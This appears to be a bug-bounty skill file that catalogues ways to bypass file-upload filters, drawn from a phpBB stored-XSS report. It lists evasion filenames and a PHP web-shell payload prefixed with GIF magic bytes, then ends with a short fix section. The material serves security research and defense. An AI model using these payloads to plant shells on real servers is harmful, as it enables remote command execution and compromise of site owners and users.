---
name: upload-blocklist-bypass
description: Bypassing file-upload filters — blocklist extensions, magic-byte checks, and length/scan limits (phpBB SVG worm). Teaches the full catalog of upload-filter evasion.
sources: hackerone_public
report_count: 1
---

# Upload Filter / Blocklist Bypass

**Report**: phpBB — "Stored XSS via SVG Upload — check_content() blocklist bypass & 256-byte scan limit (self-propagating worm)" (#3606773).

## Why it matters (the new lesson)
Upload filters are almost always **blocklists**, not allowlists, and content scanners only inspect the first N bytes. Every filter has a bypass; the phpBB case shows even a "content check" that scans only 256 bytes + an extension blocklist is trivially defeated — producing a self-propagating XSS worm.

## How it works — bypass catalog
- **Extension**: `.php` → `.php5`, `.phtml`, `.pht`, `.phar`, `.shtml`, `.phtm`, `.php.`, `.php.jpg`, `.php%00.jpg`, uppercase `PHP`, double `file.php.php`, trailing space/dot.
- **Magic bytes**: prepend `GIF89a;` or `\xff\xd8\xff\xe0` to pass image checks (`GIF89a; <?php ... ?>`).
- **Scan-length limit**: pad payload past the scanner's read window (the 256-byte case).
- **Double extension / MIME spoofing**: set `Content-Type: image/jpeg` for a `.php`.
- **Polyglot**: a file that is both a valid image and valid code.

## How to hunt for it
1. Upload a benign file; study the validation (error messages reveal the check).
2. Iterate the bypass catalog; confirm which lands.
3. Verify execution/rendering of the bypassed file.

## Payloads
```
filename=shell.php5
filename=shell.phtml
filename=shell.php.jpg
filename=shell.php%00.jpg
body=GIF89a;<?php system($_GET[c]);?>
```

## Fix
Allowlist extensions + MIME + server-side rename; store outside webroot; re-encode images; scan full content (no length cap).
